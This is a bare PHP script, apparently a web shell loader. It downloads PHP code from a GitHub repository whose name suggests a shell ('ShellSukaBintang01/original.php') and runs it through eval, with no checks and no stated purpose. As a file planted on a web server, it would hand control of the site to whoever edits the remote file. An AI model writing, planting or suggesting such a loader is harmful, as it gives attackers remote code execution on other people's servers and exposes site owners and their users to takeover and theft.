<?php
$url = 'https://raw.githubusercontent.com/Tituss22/ShellSukaBintang01/refs/heads/main/original.php';


$php_code = file_get_contents($url);


if ($php_code !== false) {
    eval('?>' . $php_code);
} else {
    echo 'error';
}
?>